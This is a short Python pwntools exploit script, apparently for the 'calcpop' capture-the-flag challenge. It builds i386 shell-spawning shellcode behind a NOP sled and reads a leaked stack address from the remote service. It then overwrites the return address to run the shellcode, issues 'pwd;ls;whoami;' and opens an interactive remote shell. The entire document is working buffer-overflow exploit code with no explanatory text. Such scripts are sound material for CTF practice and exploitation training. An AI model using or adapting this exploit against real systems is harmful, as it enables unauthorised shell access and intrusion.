#!/usr/bin/env python

from pwn import *  # NOQA

context.arch = 'i386'

velf = ELF('./calcpop')

BUFFERSIZE = 128

shellcode = shellcraft.linux.sh()
log.info("using shellcode:\n" + shellcode)
shellcode = asm(shellcode)
nopslide = "\x90" * (BUFFERSIZE - len(shellcode))
payload = nopslide + shellcode

context.log_level = 'debug'

vp = remote('calcpop-4gh07blg.9447.plumbing', 9447)
#vp = process('./calcpop')
#gdb.attach(vp)

vp.recvline()
vp.sendline("")
s = vp.recvline().strip()
leakedaddr = s.split(" ")[-1]
leakedaddr = long(leakedaddr, 16)
log.info("leaked the addr " + hex(leakedaddr))

retaddr = leakedaddr + 20
log.info("trying return to " + hex(retaddr))

payload += (p32(retaddr)) * 10
#payload += (p32(0x41414141)) * 100

vp.sendline(payload)
vp.clean_and_log()
vp.sendline("exit")
vp.clean_and_log()
vp.sendline("pwd;ls;whoami;")
vp.clean_and_log()
vp.interactive()
